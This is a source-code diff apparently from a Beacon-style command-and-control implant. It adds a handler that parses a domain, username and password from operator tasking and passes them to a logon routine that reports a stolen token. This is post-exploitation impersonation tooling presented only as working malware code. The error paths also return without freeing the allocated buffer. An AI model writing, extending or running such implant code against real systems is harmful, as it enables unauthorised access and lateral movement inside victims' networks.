@@ -248,3 +248,38 @@ void IdentityLoginUserInternal(char* domain, char* username, char* password)
 		BeaconOutput(CALLBACK_TOKEN_STOLEN, username, strlen(username));
 	}
 }
+
+void IdentityLoginUser(char* buffer, int length)
+{
+#define MAX_DOMAIN 1024
+#define MAX_USERNAME 1024
+#define MAX_PASSWORD 1024
+
+	datap* locals = BeaconDataAlloc(MAX_DOMAIN + MAX_USERNAME + MAX_PASSWORD);
+	char* domain = BeaconDataPtr(locals, MAX_DOMAIN);
+	char* username = BeaconDataPtr(locals, MAX_USERNAME);
+	char* password = BeaconDataPtr(locals, MAX_PASSWORD);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	if(!BeaconDataStringCopySafe(&parser, domain, MAX_DOMAIN))
+	{
+		LERROR("Failed to parse domain");
+		return;
+	}
+
+	if(!BeaconDataStringCopySafe(&parser, username, MAX_USERNAME))
+	{
+		LERROR("Failed to parse username");
+		return;
+	}
+
+	if(!BeaconDataStringCopySafe(&parser, password, MAX_PASSWORD))
+	{
+		LERROR("Failed to parse password");
+		return;
+	}
+
+	IdentityLoginUserInternal(domain, username, password);
+	BeaconDataFree(locals);
+}
